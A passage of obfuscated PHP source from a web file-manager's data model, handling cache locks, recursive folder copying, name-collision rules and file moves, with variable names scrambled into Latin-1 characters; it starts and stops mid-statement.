(isset($°©†‚’[$½Ğ‚š…])) { continue; } $ØÂºš[$àÒá¥Åë[2214]] = IpLocation::get($ØÂºš[$àÒá¥Åë[2210]]); $ØÂºš[$àÒá¥Åë[451]] = $¯Ò†¡üè; $°©†‚’[$½Ğ‚š…] = $ØÂºš; } return array_values($°©†‚’); } public function deviceType($éş›çÁ) { return $éş›çÁ; } } goto CÎœïÕ©Î; a‡‚Í÷İ¾: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($öñºÉŞ™) { $—ü¢–íÀ =& $_SERVER[¹àö™Ç¾]; if (!$this->allowLock()) { return; } $this->_lockCheck($—ü¢–íÀ[549], $öñºÉŞ™); $Çî äÉ = 1; $this->_lockEvent($öñºÉŞ™, array($—ü¢–íÀ[550], $—ü¢–íÀ[551]), $Çî äÉ); $this->_lockParent($öñºÉŞ™, array($—ü¢–íÀ[551]), $Çî äÉ); $this->_lockEvent($öñºÉŞ™, array($—ü¢–íÀ[552], $—ü¢–íÀ[553]), $Çî äÉ); $this->_lockCheckEnd($—ü¢–íÀ[549], $öñºÉŞ™); } public function lockCopyEnd($­ÆĞÖ¨) { $ƒŠØÂÖ“ =& $_SERVER[¹àö™Ç¾]; if (!$this->allowLock()) { return; } $½ÆšÉÊ— = 0; $this->_lockEvent($­ÆĞÖ¨, array($ƒŠØÂÖ“[550], $ƒŠØÂÖ“[551]), $½ÆšÉÊ—); $this->_lockParent($­ÆĞÖ¨, array($ƒŠØÂÖ“[551]), $½ÆšÉÊ—); $this->_lockEvent($­ÆĞÖ¨, array($ƒŠØÂÖ“[552], $ƒŠØÂÖ“[553]), $½ÆšÉÊ—); } public function lockWriteStart($¿³ä°ë, $¼÷Æƒä÷ = '') { $Ã¼òÔ‰Ë =& $_SERVER[¹àö™Ç¾]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ã¼òÔ‰Ë[550], $¿³ä°ë); $ó Í¢ ÷ = 1; $this->_lockKey($Ã¼òÔ‰Ë[554] . $¿³ä°ë . $Ã¼òÔ‰Ë[20] . $¼÷Æƒä÷, $ó Í¢ ÷); $this->_lockEvent($¿³ä°ë, array($Ã¼òÔ‰Ë[549], $Ã¼òÔ‰Ë[551]), $ó Í¢ ÷); $this->_lockParent($¿³ä°ë, array($Ã¼òÔ‰Ë[549], $Ã¼òÔ‰Ë[551]), $ó Í¢ ÷); $this->_lockCheckEnd($Ã¼òÔ‰Ë[550], $¿³ä°ë); } public function lockWriteEnd($Ö­íïÛà, $ş÷ÄïÏ = '') { $«§ÕÈ˜å =& $_SERVER[¹àö™Ç¾]; if (!$this->allowLock()) { return; } $Ô„³±¿ = 0; $this->_lockKey($«§ÕÈ˜å[554] . $Ö­íïÛà . $«§ÕÈ˜å[20] . $ş÷ÄïÏ, $Ô„³±¿); $this->_lockEvent($Ö­íïÛà, array($«§ÕÈ˜å[549], $«§ÕÈ˜å[551]), $Ô„³±¿); $this->_lockParent($Ö­íïÛà, array($«§ÕÈ˜å[549], $«§ÕÈ˜å[551]), $Ô„³±¿); } public function lockMoveStart($Ñ¦’—šë) { $•Âôæ°¿ =& $_SERVER[¹àö™Ç¾]; if (!$this->allowLock()) { return; } $this->_lockCheck($•Âôæ°¿[551], $Ñ¦’—šë); $Á€ŞÂ‚ = 1; $this->_lockKey($•Âôæ°¿[555] . $Ñ¦’—šë, $Á€ŞÂ‚); $this->_lockEvent($Ñ¦’—šë, array($•Âôæ°¿[549], $•Âôæ°¿[550]), $Á€ŞÂ‚); $this->_lockParent($Ñ¦’—šë, array($•Âôæ°¿[549], $•Âôæ°¿[551]), $Á€ŞÂ‚); $this->_lockEvent($Ñ¦’—šë, array($•Âôæ°¿[556], $•Âôæ°¿[552], $•Âôæ°¿[553]), $Á€ŞÂ‚); $this->_lockCheckEnd($•Âôæ°¿[551], $Ñ¦’—šë); } public function lockMoveEnd($ºÖ²ø¢‰) { $¨æô¥ä¯ =& $_SERVER[¹àö™Ç¾]; if (!$this->allowLock()) { return; } $ÂÌ§’… = 0; $this->_lockKey($¨æô¥ä¯[555] . $ºÖ²ø¢‰, $ÂÌ§’…); $this->_lockEvent($ºÖ²ø¢‰, array($¨æô¥ä¯[549], $¨æô¥ä¯[550]), $ÂÌ§’…); $this->_lockParent($ºÖ²ø¢‰, array($¨æô¥ä¯[549], $¨æô¥ä¯[551]), $ÂÌ§’…); $this->_lockEvent($ºÖ²ø¢‰, array($¨æô¥ä¯[556], $¨æô¥ä¯[552], $¨æô¥ä¯[553]), $ÂÌ§’…); } private function _lockCheck($šÓŒÀõò, $’àÁ¾ŒĞ) { $¡´—Å²ş =& $_SERVER[¹àö™Ç¾]; $˜©¥™½ = $this->sourceInfo($’àÁ¾ŒĞ); $ãÙ­Áá = $šÓŒÀõò . $¡´—Å²ş[20] . $’àÁ¾ŒĞ; $this->_lockTimeStart[$ãÙ­Áá] = timeFloat(); if (!is_array($˜©¥™½)) { return; } $¸™âé„Ç = LNG($¡´—Å²ş[557]); CacheLock::setErrorMsg($¡´—Å²ş[169] . htmlspecialchars($˜©¥™½[$¡´—Å²ş[42]]) . $¡´—Å²ş[536] . $¸™âé„Ç); $this->_lockKey($ãÙ­Áá, 1); $this->_lockKey($ãÙ­Áá, 0); $Ñ¡Û’È¦ = array_reverse($this->parentLevelArray($˜©¥™½[$¡´—Å²ş[521]])); foreach ($Ñ¡Û’È¦ as $ÖÈÑŸ†é) { $ãÙ­Áá = $šÓŒÀõò . $¡´—Å²ş[558] . $ÖÈÑŸ†é; if (CacheLock::lockGet($¡´—Å²ş[559] . $ãÙ­Áá)) { $˜©¥™½ = $this->sourceInfo($ÖÈÑŸ†é); CacheLock::setErrorMsg($¡´—Å²ş[169] . htmlspecialchars($˜©¥™½[$¡´—Å²ş[42]]) . $¡´—Å²ş[536] . $¸™âé„Ç); $this->_lockKey($ãÙ­Áá, 1); $this->_lockKey($ãÙ­Áá, 0); } } } private function _lockCheckEnd($á‘â«ÑĞ, $Ï¿šÍ£) { $ÆèâÕÒ¯ =& $_SERVER[¹àö™Ç¾]; $öûİ„õı = $á‘â«ÑĞ . $ÆèâÕÒ¯[20] . $Ï¿šÍ£; CacheLock::setErrorMsg($ÆèâÕÒ¯[382]); if (!isset($this->_lockTimeStart[$öûİ„õı])) { return; } $¶øî²³¤ = timeFloat() - $this->_lockTimeStart[$öûİ„õı]; unset($this->_lockTimeStart[$öûİ„õı]); if ($¶øî²³¤ > 0.5) { unset(self::$cacheSourceInfo[$ÆèâÕÒ¯[458] . $Ï¿šÍ£]); } $ÒÎîß·î = $this->sourceInfo($Ï¿šÍ£); if (!$ÒÎîß·î) { show_json(LNG($ÆèâÕÒ¯[116]), !1); } } private function _lockParent($ÚìœÉÃ÷, $ë£ ê¦ì, $Ğ™Ù’¡ç) { if (!$this->autoLockSet) { return; } $²è¾ª£´ = $this->sourceInfo($ÚìœÉÃ÷); if (!is_array($²è¾ª£´)) { return; } $ù©±â¼Ë = array_reverse($this->parentLevelArray($²è¾ª£´[$_SERVER[¹àö™Ç¾][521]])); foreach ($ù©±â¼Ë as $«øıŠèı) { $this->_lockEvent($«øıŠèı, $ë£ ê¦ì, $Ğ™Ù’¡ç); } } private function _lockEvent($‡‡¢î“Ü, $ùóÕ€‹¢, $¹§¬ÛµÍ) { $Ô¬¼ÀÍ =& $_SERVER[¹àö™Ç¾]; if (!$this->autoLockSet) { return; } foreach ($ùóÕ€‹¢ as $û½Ïï) { $àßôÃ = $û½Ïï . $Ô¬¼ÀÍ[20] . $‡‡¢î“Ü; if ($¹§¬ÛµÍ && CacheLock::lockGet($Ô¬¼ÀÍ[559] . $àßôÃ)) { continue; } $this->_lockKey($àßôÃ, $¹§¬ÛµÍ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Òˆ”Ñùé, $ÑôÎ£¸Ö = 1) { $›Òù²¿Ó = $_SERVER[¹àö™Ç¾][559] . md5($Òˆ”Ñùé); if ($ÑôÎ£¸Ö) { if (isset(self::$_lockItemArr[$›Òù²¿Ó])) { return; } self::$_lockItemArr[$›Òù²¿Ó] = 1; CacheLock::lock($›Òù²¿Ó, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$›Òù²¿Ó])) { return; } unset(self::$_lockItemArr[$›Òù²¿Ó]); CacheLock::unlock($›Òù²¿Ó); } } public function isParentOf($ãäš¾•£, $è–Ãë”—) { $ŒÖÚÕ‘¸ =& $_SERVER[¹àö™Ç¾]; $–›ÃÛ·Ì = $this->sourceInfo($ãäš¾•£); $ÈøœÌÃ = $this->sourceInfo($è–Ãë”—); $»óâá£¶ = $–›ÃÛ·Ì[$ŒÖÚÕ‘¸[521]] . $–›ÃÛ·Ì[$ŒÖÚÕ‘¸[403]] . $ŒÖÚÕ‘¸[60]; $ÂÙÓ˜éœ = $ÈøœÌÃ[$ŒÖÚÕ‘¸[521]] . $ÈøœÌÃ[$ŒÖÚÕ‘¸[403]] . $ŒÖÚÕ‘¸[60]; $ã÷áÕÈ = strpos($ÂÙÓ˜éœ, $»óâá£¶) === 0; return $ã÷áÕÈ; } private $targetIsDelete = 0; public function copy($ïéâ¦¼, $áúó‡Øº, $ÛØôöÌ† = REPEAT_REPLACE, $£ ßÖ²µ = '') { $îÜßŒÛê =& $_SERVER[¹àö™Ç¾]; $‡ñšÙÕö = $this->sourceInfo($ïéâ¦¼); $ÅÂ÷ß¨¯ = $this->sourceInfo($áúó‡Øº); if (!$‡ñšÙÕö || !$ÅÂ÷ß¨¯ || $ÅÂ÷ß¨¯[$îÜßŒÛê[411]] != $îÜßŒÛê[99]) { return !1; } if ($this->isParentOf($ïéâ¦¼, $áúó‡Øº)) { return !1; } $”úÄÛÄà = $£ ßÖ²µ ? $£ ßÖ²µ : $‡ñšÙÕö[$îÜßŒÛê[42]]; $this->lockCopyStart($ïéâ¦¼); $this->lockWriteStart($áúó‡Øº, $”úÄÛÄà); $Ë¼ËÍ²› = array($îÜßŒÛê[560] => array(), $îÜßŒÛê[561] => array(), $îÜßŒÛê[562] => array()); $this->targetIsDelete = intval($‡ñšÙÕö[$îÜßŒÛê[431]]); $âØ‰†»Œ = $this->fileNameExistCache($áúó‡Øº, $‡ñšÙÕö[$îÜßŒÛê[42]]); $Í „íÉš = $this->_copy($ïéâ¦¼, $áúó‡Øº, $ÛØôöÌ†, $Ë¼ËÍ²›, !0, $£ ßÖ²µ); $this->_childrenListClear(); $this->lockCopyEnd($ïéâ¦¼); $this->lockWriteEnd($áúó‡Øº, $”úÄÛÄà); if ($‡ñšÙÕö[$îÜßŒÛê[411]] == $îÜßŒÛê[99] && $âØ‰†»Œ == $Í „íÉš) { $this->folderSizeResetChildren($âØ‰†»Œ); } Model($îÜßŒÛê[563])->addAll($Ë¼ËÍ²›[$îÜßŒÛê[561]], array(), !0); if ($âØ‰†»Œ != $Í „íÉš || $‡ñšÙÕö[$îÜßŒÛê[411]] == $îÜßŒÛê[99]) { Model($îÜßŒÛê[564])->eventCopy($Í „íÉš); } $this->saveAll($Ë¼ËÍ²›[$îÜßŒÛê[562]]); Model($îÜßŒÛê[202])->linkAdd($Ë¼ËÍ²›[$îÜßŒÛê[560]]); $this->folderSizeReset($áúó‡Øº); $this->updateModifyTime($áúó‡Øº); return $Í „íÉš; } private function _copy($ß©´Ê™ş, $Ëßˆœ·, $ëƒ¸îşò, &$çÈö½Å, $š‘Û¾¶ö, $½ˆ„Ô÷í = '') { $ÚÚıÉª =& $_SERVER[¹àö™Ç¾]; $æÇÑˆ©Ë = $this->sourceInfoCache($ß©´Ê™ş); $ŞÁºŸ‰Î = $æÇÑˆ©Ë[$ÚÚıÉª[411]] == $ÚÚıÉª[99]; $¤¢ŸÓÈí = $½ˆ„Ô÷í ? $½ˆ„Ô÷í : $æÇÑˆ©Ë[$ÚÚıÉª[42]]; $§ı½Œî¯ = $this->fileNameExistCache($Ëßˆœ·, $¤¢ŸÓÈí); if ($š‘Û¾¶ö) { $this->_childrenAllMake($ß©´Ê™ş); if ($ŞÁºŸ‰Î && $§ı½Œî¯) { $this->_childrenAllMake($§ı½Œî¯); } } if (!$§ı½Œî¯) { return $this->_copyCreate($ß©´Ê™ş, $Ëßˆœ·, $¤¢ŸÓÈí, $çÈö½Å); } $Ïêº’ûø = $§ı½Œî¯; if ($ŞÁºŸ‰Î) { if ($ëƒ¸îşò == REPEAT_RENAME_FOLDER) { $¤¢ŸÓÈí = $this->fileNameAutoCache($Ëßˆœ·, $¤¢ŸÓÈí, $ëƒ¸îşò, $ŞÁºŸ‰Î); $Ïêº’ûø = $this->_copyCreate($ß©´Ê™ş, $Ëßˆœ·, $¤¢ŸÓÈí, $çÈö½Å); } else { $Ÿ“Â¸ı© = $this->_childrenList($ß©´Ê™ş); foreach ($Ÿ“Â¸ı© as $õŸ¸ãÕÚ) { $this->_copy($õŸ¸ãÕÚ[$ÚÚıÉª[403]], $§ı½Œî¯, $ëƒ¸îşò, $çÈö½Å, !1); } } } else { if ($ëƒ¸îşò == REPEAT_RENAME || $ëƒ¸îşò == REPEAT_RENAME_FOLDER) { $¤¢ŸÓÈí = $this->fileNameAutoCache($Ëßˆœ·, $¤¢ŸÓÈí, $ëƒ¸îşò, $ŞÁºŸ‰Î); $Ïêº’ûø = $this->_copyCreate($ß©´Ê™ş, $Ëßˆœ·, $¤¢ŸÓÈí, $çÈö½Å); } else { if ($ëƒ¸îşò == REPEAT_REPLACE) { $ış´¹½ = $this->sourceInfoCache($§ı½Œî¯); $Ù„ÉİŞ¿ = $this->fileHistory($ış´¹½, $æÇÑˆ©Ë[$ÚÚıÉª[467]], $æÇÑˆ©Ë[$ÚÚıÉª[90]]); if ($Ù„ÉİŞ¿) { $çÈö½Å[$ÚÚıÉª[560]][] = $æÇÑˆ©Ë[$ÚÚıÉª[467]]; } } else { if ($ëƒ¸îşò == REPEAT_SKIP) { } } } Hook::trigger($ÚÚıÉª[565], array($ÚÚıÉª[566], $æÇÑˆ©Ë, 0)); } return $Ïêº’ûø; } private function _copyCreate($Ñì®•, $±ÖáÓÖİ, $¯öî˜š, &$ôÑªµäª) { $Òéò“‹Ğ =& $_SERVER[¹àö™Ç¾]; $€çÇê¾ä = $this->sourceInfoCache($Ñì®•); $ƒßíşÎê = $this->sourceInfoCache($±ÖáÓÖİ); $äÉûôš = $this->_makeItemData($€çÇê¾ä, $ƒßíşÎê, $¯öî˜š); Hook::trigger($Òéò“‹Ğ[567], $äÉûôš); Hook::trigger($Òéò“‹Ğ[568], array($Òéò“‹Ğ[569], $äÉûôš, 0)); $Ãú²‹ó = $this->add($äÉûôš); $¯õ¹¯íŞ = array($Òéò“‹Ğ[403] => $Ãú²‹ó, $Òéò“‹Ğ[42] => $¯öî˜š); $this->_copyApplyMeta($¯õ¹¯íŞ, $ôÑªµäª); if ($€çÇê¾ä[$Òéò“‹Ğ[411]] != $Òéò“‹Ğ[99]) { $ôÑªµäª[$Òéò“‹Ğ[560]][] = $€çÇê¾ä[$Òéò“‹Ğ[467]]; return $Ãú²‹ó; } $Ÿ«¦ø¢  = array(); $è­„¨˜Ñ = array(); $this->_childrenListAll($Ñì®•, $Ÿ«¦ø¢ ); $€ÃİÄÕĞ = count($Ÿ«¦ø¢ ); if ($€ÃİÄÕĞ == 0) { return $Ãú²‹ó; } $ÔšÎÖÏÌ = $this->sourceInfo($Ãú²‹ó); foreach ($Ÿ«¦ø¢  as $¦¨Å½À„) { $“óªÊÛ = $this->_makeItemData($¦¨Å½À„, $ÔšÎÖÏÌ, $¦¨Å½À„[$Òéò“‹Ğ[42]]); $“óªÊÛ[$Òéò“‹Ğ[521]] = $¦¨Å½À„[$Òéò“‹Ğ[521]]; $è­„¨˜Ñ[] = $“óªÊÛ; } $this->chunkEventSet($Òéò“‹Ğ[570], array($Òéò“‹Ğ[571], $äÉûôš, $€ÃİÄÕĞ)); $this->addAll($è­„¨˜Ñ, array(), !1); $²ÏèåÍÛ = $this->where(array($Òéò“‹Ğ[498] => $Ãú²‹ó))->select(); $Éú”¿‘» = $this->_childrenMakeRelation($Ÿ«¦ø¢ , $²ÏèåÍÛ); $Éú”¿‘»[$Ñì®•] = $Ãú²‹ó; $ÕÔÏ… = array(); $ÑİóÖåÛ = array(); foreach ($²ÏèåÍÛ as $¦¨Å½À„) { $‰”½¦¸ = $¦¨Å½À„[$Òéò“‹Ğ[403]]; $ÓŸ©ú¶¿ = $this->_childrenMatch($Éú”¿‘», $¦¨Å½À„, $ÔšÎÖÏÌ); $ÕÔÏ…[] = array($Òéò“‹Ğ[403], $‰”½¦¸, $Òéò“‹Ğ[498], $ÓŸ©ú¶¿[$Òéò“‹Ğ[498]]); $ÑİóÖåÛ[] = array($Òéò“‹Ğ[403], $‰”½¦¸, $Òéò“‹Ğ[521], $ÓŸ©ú¶¿[$Òéò“‹Ğ[521]]); $this->_copyApplyMeta($¦¨Å½À„, $ôÑªµäª); if ($¦¨Å½À„[$Òéò“‹Ğ[411]] != $Òéò“‹Ğ[99]) { $ôÑªµäª[$Òéò“‹Ğ[560]][] = $¦¨Å½À„[$Òéò“‹Ğ[467]]; } } $this->chunkEventSet($Òéò“‹Ğ[572], array($Òéò“‹Ğ[573], $äÉûôš, $€ÃİÄÕĞ)); $this->saveAll($ÕÔÏ…); $this->chunkEventSet($Òéò“‹Ğ[574], array($Òéò“‹Ğ[575], $äÉûôš, $€ÃİÄÕĞ)); $this->saveAll($ÑİóÖåÛ); return $Ãú²‹ó; } private function _childrenMakeRelation($°ÅÒ‹, $®ìî¤–¡) { $áşÖ¶×ú =& $_SERVER[¹àö™Ç¾]; $³òó¨«™ = array(); $Ù’Ö†ƒò = array(); foreach ($°ÅÒ‹ as $ä°º×³) { $â†Ö«Ú˜ = $ä°º×³[$áşÖ¶×ú[42]] . $áşÖ¶×ú[18] . $ä°º×³[$áşÖ¶×ú[521]]; $³òó¨«™[$â†Ö«Ú˜] = $ä°º×³[$áşÖ¶×ú[403]]; } foreach ($®ìî¤–¡ as $ä°º×³) { $â†Ö«Ú˜ = $ä°º×³[$áşÖ¶×ú[42]] . $áşÖ¶×ú[18] . $ä°º×³[$áşÖ¶×ú[521]]; $Ï›’ÚË¥ = $³òó¨«™[$â†Ö«Ú˜]; $Ù’Ö†ƒò[$Ï›’ÚË¥] = $ä°º×³[$áşÖ¶×ú[403]]; } return $Ù’Ö†ƒò; } private function _childrenMatch($Ä˜²ˆÏº, $Ôæ¸…„Š, $ıÌŸˆ¢) { $ùÀµ»ÉÕ =& $_SERVER[¹àö™Ç¾]; $Š«¤ıİ = $ıÌŸˆ¢[$ùÀµ»ÉÕ[521]]; $ä¼«ÅìÅ = $this->parentLevelArray($Ôæ¸…„Š[$ùÀµ»ÉÕ[521]]); foreach ($ä¼«ÅìÅ as $ëæÏûà¸) { if (isset($Ä˜²ˆÏº[$ëæÏûà¸])) { $Š«¤ıİ .= $Ä˜²ˆÏº[$ëæÏûà¸] . $ùÀµ»ÉÕ[576]; } } $Š«¤ıİ = rtrim($Š«¤ıİ, $ùÀµ»ÉÕ[60]) . $ùÀµ»ÉÕ[60]; $à‰ùÃÖ = $this->parentLevelArray($Š«¤ıİ); $¶›•¬¹Ş = $à‰ùÃÖ[count($à‰ùÃÖ) - 1]; return array($ùÀµ»ÉÕ[498] => $¶›•¬¹Ş, $ùÀµ»ÉÕ[521] => $Š«¤ıİ); } private function _makeItemData($³ûñš¾, $ğ¨œª, $¿¼¸©Øö) { $™ğ¥üé½ =& $_SERVER[¹àö™Ç¾]; $Çñä€Â´ = array($™ğ¥üé½[577] => $³ûñš¾[$™ğ¥üé½[411]], $™ğ¥üé½[421] => $¿¼¸©Øö, $™ğ¥üé½[578] => $³ûñš¾[$™ğ¥üé½[413]] ? $³ûñš¾[$™ğ¥üé½[413]] : $™ğ¥üé½[22], $™ğ¥üé½[468] => $³ûñš¾[$™ğ¥üé½[467]] ? $³ûñš¾[$™ğ¥üé½[467]] : 0, $™ğ¥üé½[579] => $³ûñš¾[$™ğ¥üé½[90]] ? $³ûñš¾[$™ğ¥üé½[90]] : 0, $™ğ¥üé½[580] => intval($ğ¨œª[$™ğ¥üé½[412]]), $™ğ¥üé½[581] => intval($ğ¨œª[$™ğ¥üé½[504]]), $™ğ¥üé½[582] => intval(USER_ID), $™ğ¥üé½[583] => intval(USER_ID), $™ğ¥üé½[402] => intval($ğ¨œª[$™ğ¥üé½[403]]), $™ğ¥üé½[584] => $ğ¨œª[$™ğ¥üé½[521]] . $ğ¨œª[$™ğ¥üé½[403]] . $™ğ¥üé½[60], $™ğ¥üé½[425] => $³ûñš¾[$™ğ¥üé½[96]] ? $³ûñš¾[$™ğ¥üé½[96]] : time(), $™ğ¥üé½[430] => 0, $™ğ¥üé½[585] => $™ğ¥üé½[22]); return $Çñä€Â´; } private function _copyApplyMeta($¥‚ˆ¯ïŒ, &$§¤Á›¬é) { $¶ğó™ô =& $_SERVER[¹àö™Ç¾]; $ˆûö³î… = $¥‚ˆ¯ïŒ[$¶ğó™ô[403]]; $Ò™´­â = $¥‚ˆ¯ïŒ[$¶ğó™ô[42]]; if (!isset($¥‚ˆ¯ïŒ[$¶ğó™ô[586]]) || !$¥‚ˆ¯ïŒ[$¶ğó™ô[586]] || $¥‚ˆ¯ïŒ[$¶ğó™ô[586]] == $¶ğó™ô[200]) { $§¤Á›¬é[$¶ğó™ô[562]][] = array($¶ğó™ô[403], $ˆûö³î…, $¶ğó™ô[586], short_id($ˆûö³î…)); } if (Input::check($Ò™´­â, $¶ğó™ô[587])) { $§¤Á›¬é[$¶ğó™ô[561]][] = array($¶ğó™ô[403] => $ˆûö³î…, $¶ğó™ô[105] => $¶ğó™ô[464], $¶ğó™ô[378] => str_replace($¶ğó™ô[63], $¶ğó™ô[22], Pinyin::get($Ò™´­â))); $§¤Á›¬é[$¶ğó™ô[561]][] = array($¶ğó™ô[403] => $ˆûö³î…, $¶ğó™ô[105] => $¶ğó™ô[463], $¶ğó™ô[378] => Pinyin::get($Ò™´­â, $¶ğó™ô[588])); } $§¤Á›¬é[$¶ğó™ô[561]][] = array($¶ğó™ô[403] => $ˆûö³î…, $¶ğó™ô[105] => $¶ğó™ô[442], $¶ğó™ô[378] => KodSort::makeStr($Ò™´­â)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ò‹ÑØæÉ) { $ã„Ú»¿ =& $_SERVER[¹àö™Ç¾]; $‘­ØÕÌ = $this->sourceInfo($ò‹ÑØæÉ); $±·Ğî¶å = $ã„Ú»¿[589]; $ê†¯º©§ = array($ã„Ú»¿[521] => array($ã„Ú»¿[544], $‘­ØÕÌ[$ã„Ú»¿[521]] . $ò‹ÑØæÉ . $ã„Ú»¿[545]), $ã„Ú»¿[431] => $this->targetIsDelete); $§ë×²ËÉ = $this->field($±·Ğî¶å)->where($ê†¯º©§)->select(); if (!$§ë×²ËÉ) { return; } $§ë×²ËÉ = array_to_keyvalue($§ë×²ËÉ, $ã„Ú»¿[403]); foreach ($§ë×²ËÉ as $óÏçª•ô) { $©–­êµ = $óÏçª•ô[$ã„Ú»¿[498]]; $ò‹ÑØæÉ = $óÏçª•ô[$ã„Ú»¿[403]]; if (!isset($this->_childrenListCache[$ò‹ÑØæÉ]) && $óÏçª•ô[$ã„Ú»¿[411]] == $ã„Ú»¿[99]) { $this->_childrenListCache[$ò‹ÑØæÉ] = array(); } if (!isset($this->_childrenListCache[$©–­êµ])) { $this->_childrenListCache[$©–­êµ] = array(); } $this->_childrenListCache[$©–­êµ][$ò‹ÑØæÉ] = $óÏçª•ô; $this->_childrenItemCache[$ò‹ÑØæÉ] = $óÏçª•ô; } } private function _childrenListAll($“™®Ò¦è, &$Ö–èÍÍ) { $¿¹™Ò¹ =& $_SERVER[¹àö™Ç¾]; if (!isset($this->_childrenListCache[$“™®Ò¦è])) { return; } $˜ÙàËÂæ = $this->_childrenListCache[$“™®Ò¦è]; foreach ($˜ÙàËÂæ as $í°ØÌµˆ => $Ä…¿±û¿) { $Ö–èÍÍ[$í°ØÌµˆ] = $Ä…¿±û¿; if ($Ä…¿±û¿[$¿¹™Ò¹[411]] == $¿¹™Ò¹[99]) { $this->_childrenListAll($í°ØÌµˆ, $Ö–èÍÍ); } } } private function sourceInfoCache($‹Ç¯¨Û­) { if (isset($this->_childrenItemCache[$‹Ç¯¨Û­])) { return $this->_childrenItemCache[$‹Ç¯¨Û­]; } return $this->sourceInfo($‹Ç¯¨Û­); } private function _childrenList($“ıĞÎ¼¥) { if (isset($this->_childrenListCache[$“ıĞÎ¼¥])) { return $this->_childrenListCache[$“ıĞÎ¼¥]; } return $this->_childrenListSelect($“ıĞÎ¼¥); } private function _childrenListSelect($òäÙ¹µ) { $»şí«ı­ =& $_SERVER[¹àö™Ç¾]; $§ïÉŸŠ = array($»şí«ı­[498] => $òäÙ¹µ, $»şí«ı­[431] => $this->targetIsDelete); $÷ˆˆê½ = $this->where($§ïÉŸŠ)->select(); $÷ˆˆê½ = $÷ˆˆê½ ? $÷ˆˆê½ : array(); $±¿ŠÍ­» = array_to_keyvalue($÷ˆˆê½, $»şí«ı­[403]); $this->_childrenListCache[$òäÙ¹µ] = $±¿ŠÍ­»; foreach ($±¿ŠÍ­» as $òäÙ¹µ => $—×Ä²ö‡) { $this->_childrenItemCache[$òäÙ¹µ] = $—×Ä²ö‡; } return $±¿ŠÍ­»; } private function fileNameExistCache($ùŸŠ‹•Ÿ, $¡«ƒ´Ãì) { $—Ú­ù¥Å =& $_SERVER[¹àö™Ç¾]; $¡«ƒ´Ãì = strtolower($¡«ƒ´Ãì); $›ÜĞ¹€ = $this->_childrenList($ùŸŠ‹•Ÿ); foreach ($›ÜĞ¹€ as $Ñ˜¬ê) { if ($¡«ƒ´Ãì == strtolower($Ñ˜¬ê[$—Ú­ù¥Å[42]])) { return $Ñ˜¬ê[$—Ú­ù¥Å[403]]; } } return !1; } private function fileNameAutoCache($¬ÍŒÕ±Î, $Åö¿¨ôÍ, $Ï¬çÀ ä, $ÕÖ­¤Éú) { $ÃÈ—§” =& $_SERVER[¹àö™Ç¾]; $ääö¶£è = $this->_childrenList($¬ÍŒÕ±Î); $ŸÄı“½È = array_to_keyvalue($ääö¶£è, $ÃÈ—§”[22], $ÃÈ—§”[42]); return $this->fileNameAutoGet($ŸÄı“½È, $Åö¿¨ôÍ, $Ï¬çÀ ä, $ÕÖ­¤Éú); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($š¸ŸˆÊÇ, $ª§ûµÌÊ, $ÃàÍ¬ñ = REPEAT_REPLACE, $ôôöÕüË = '') { $Å‘ªªıî =& $_SERVER[¹àö™Ç¾]; $ÔÌÅ®ø = $this->sourceInfo($š¸ŸˆÊÇ); $ŞÎØõñµ = $this->sourceInfo($ª§ûµÌÊ); if ($ÔÌÅ®ø[$Å‘ªªıî[498]] == $ŞÎØõñµ[$Å‘ªªıî[403]]) { if ($ÔÌÅ®ø[$Å‘ªªıî[431]] == $Å‘ªªıî[99]) { Model($Å‘ªªıî[429])->restore(array($š¸ŸˆÊÇ)); } if (!$ôôöÕüË || $ôôöÕüË == $ÔÌÅ®ø[$Å‘ªªıî[42]]) { return $š¸ŸˆÊÇ; } } $¯¹èÄÃ¬ = $this->pathInfoMore($š¸ŸˆÊÇ); if ($this->isParentOf($š¸ŸˆÊÇ, $ª§ûµÌÊ)) { return !1; } if (!$ÔÌÅ®ø || !$ŞÎØõñµ || $ŞÎØõñµ[$Å‘ªªıî[411]] != $Å‘ªªıî[99]) { return !1; } Hook::trigger($Å‘ªªıî[590], $¯¹èÄÃ¬); $this->targetIsDelete = intval($ÔÌÅ®ø[$Å‘ªªıî[431]]); if ($ÔÌÅ®ø[$Å‘ªªıî[498]] == $ª§ûµÌÊ && $ôôöÕüË != $ÔÌÅ®ø[$Å‘ªªıî[42]]) { $øˆáàŸ‰ = $this->fileNameExist($ª§ûµÌÊ, $ôôöÕüË); if ($øˆáàŸ‰ && $ÔÌÅ®ø[$Å‘ªªıî[411]] == $Å‘ªªıî[200]) { $°å€­¿ = $this->sourceInfo($øˆáàŸ‰); $ä¯›ñˆ³ = $this->fileHistory($°å€­¿, $ÔÌÅ®ø[$Å‘ªªıî[467]], $ÔÌÅ®ø[$Å‘ªªıî[90]]); if (!$ä¯›ñˆ³) { Model($Å‘ªªıî[470])->remove($ÔÌÅ®ø[$Å‘ªªıî[467]]); } $this->removeNow($š¸ŸˆÊÇ, !1); $this->folderSizeReset($ª§ûµÌÊ); Hook::trigger($Å‘ªªıî[591], $¯¹èÄÃ¬); return $øˆáàŸ‰; } } $Ëáßï = $ôôöÕüË ? $ôôöÕüË : $ÔÌÅ®ø[$Å‘ªªıî[42]]; $this->lockMoveStart($š¸ŸˆÊÇ); $this->lockWriteStart($ª§ûµÌÊ, $Ëáßï); $¸ãß¦Ñ· = array($Å‘ªªıî[560] => array(), $Å‘ªªıî[592] => !1); $this->clearShare($š¸ŸˆÊÇ, $ª§ûµÌÊ); $¸Íİá = $this->fileNameExistCache($ª§ûµÌÊ, $ÔÌÅ®ø[$Å‘ªªıî[42]]); $¾ú×ç¬ = $this->_move($š¸ŸˆÊÇ, $ª§ûµÌÊ, $ÃàÍ¬ñ, $¸ãß¦Ñ·, $ôôöÕüË); $this->sourceCacheClear(); if ($ÔÌÅ®ø[$Å‘ªªıî[411]] == $Å‘ªªıî[99] && $¸Íİá) { $this->folderSizeResetChildren($¾ú×ç¬); } Model($Å‘ªªıî[202])->linkAdd($¸ãß¦Ñ·[$Å‘ªªıî[560]]); if ($¸Íİá && 